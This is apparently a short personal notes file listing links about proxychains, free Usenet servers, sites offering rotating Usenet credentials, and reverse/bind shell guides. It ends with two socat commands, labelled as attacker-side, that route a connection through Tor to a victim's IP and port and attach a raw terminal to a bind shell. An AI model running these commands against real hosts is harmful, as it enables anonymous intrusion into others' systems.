### Random
- proxychains is simply great!

### Usenet (apparently they still exist)

- [Free Usenet (reddit.com)](https://www.reddit.com/r/usenet/comments/6l8h82/free_usenet/)
- [XS Usenet - Usenet server with a decent free plan](https://my.xsusenet.com) 
- [DrunkenSlug - Indexer with a decent free plan](https://drunkenslug.com/profile)
- Other rotating free usenet creds:
  - [just4today.net](http://just4today.net/)
  - [free-usenet](https://free-usenet.com)

### Reverse/Bind shells
- http://blog.atucom.net/2017/06/smallest-python-bind-shell.html
- https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
- https://bitrot.sh/cheatsheet/14-12-2017-pivoting/
- https://artkond.com/2017/03/23/pivoting-guide/#making-use-of-socks-with-proxychains
- http://pythoneiro.blogspot.com/2015/09/bind-shell-cheat-sheet.html
- Socat through tor on attacker side: Create a tunnel through tor and connect though
  the tunnel

  $  socat TCP-LISTEN:9001 SOCKS:localhost:<victim ip>:<victim port>,socksport=9150

  $  socat FILE:`tty`,raw,echo=0 TCP:localhost:9001

